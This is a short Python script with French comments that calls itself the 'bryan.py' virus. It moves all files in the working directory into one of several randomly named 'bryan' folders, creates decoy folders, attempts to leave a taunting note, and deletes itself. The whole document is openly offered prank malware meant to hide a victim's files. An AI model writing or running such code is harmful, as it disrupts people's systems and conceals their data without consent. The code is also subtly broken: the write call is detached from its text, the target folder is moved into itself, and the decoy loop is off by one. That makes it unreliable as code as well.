import shutil, os, random

# Choix du dossier contenant les fichiers
choix = random.randint(1,6) 
nom = "bryan" + str(choix)  
os.mkdir(nom)

# Déplacement des fichiers dans le dossier choisi
dir_list = os.listdir()  
for file in dir_list:     
    shutil.move(file,nom)  

# Création de dossier bryan pour cacher le choisi
for i in range (1,6):     
    if i != choix:         
        nom = "bryan" + str(i)         
        os.mkdir(nom)

# Rédaction du fichier texte 
f = open("Ne_Paniquez_Pas.txt", "w+")
f.write
(
"""
Votre ordinateur a été infécté par le virus bryan.py !!!
Tous vos fichiers ont été placés dans un des dossier bryan
Bonne chance pour les retrouver xD HAHA ^^
-Bryan la menace.
"""
)
f.close()

# Suppression du fichier python
os.remove("bryan" + str(choix) + "/bryan.py")